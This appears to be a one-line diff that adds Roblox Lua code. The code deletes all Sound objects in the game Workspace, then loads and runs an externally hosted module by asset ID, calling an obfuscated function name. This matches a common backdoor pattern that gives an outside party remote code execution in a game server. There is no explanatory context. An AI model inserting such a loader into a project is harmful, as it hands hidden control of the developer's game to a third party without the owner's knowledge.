@@ -1,0 +1,1 @@
+for i,f in pairs(game.Workspace:GetChildren()) do if f:IsA("Sound") then f:Destroy()end end require(11411634553).Hdy738Hy09F()
